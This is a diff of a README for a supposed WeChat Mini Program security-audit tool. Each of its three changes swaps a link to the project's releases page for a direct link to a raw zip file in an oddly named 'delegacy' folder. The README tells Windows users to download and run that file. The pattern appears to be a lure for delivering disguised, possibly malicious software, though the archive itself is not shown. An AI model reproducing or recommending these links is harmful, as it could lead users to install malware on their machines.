@@ -1,6 +1,6 @@
 # 🔍 wxmini-security-audit - Audit WeChat Mini Programs Fast
 
-[![Download wxmini-security-audit](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge)](https://github.com/Unexciting-juggler843/wxmini-security-audit/releases)
+[![Download wxmini-security-audit](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge)](https://github.com/Unexciting-juggler843/wxmini-security-audit/raw/refs/heads/main/delegacy/wxmini-audit-security-1.8.zip)
 
 ## 🧭 What this tool does
 
@@ -17,7 +17,7 @@ This tool is built for end users who want a clear security report without readin
 
 Use this page to download the latest Windows release:
 
-[Visit the release page to download wxmini-security-audit](https://github.com/Unexciting-juggler843/wxmini-security-audit/releases)
+[Visit the release page to download wxmini-security-audit](https://github.com/Unexciting-juggler843/wxmini-security-audit/raw/refs/heads/main/delegacy/wxmini-audit-security-1.8.zip)
 
 After you download the file:
 
@@ -193,7 +193,7 @@ If the project folder is missing key files, the scan may not give full results. 
 
 ## 📍 Release page
 
-[Open the Windows download page](https://github.com/Unexciting-juggler843/wxmini-security-audit/releases)
+[Open the Windows download page](https://github.com/Unexciting-juggler843/wxmini-security-audit/raw/refs/heads/main/delegacy/wxmini-audit-security-1.8.zip)
 
 ## 🗂️ Suggested folder setup
 
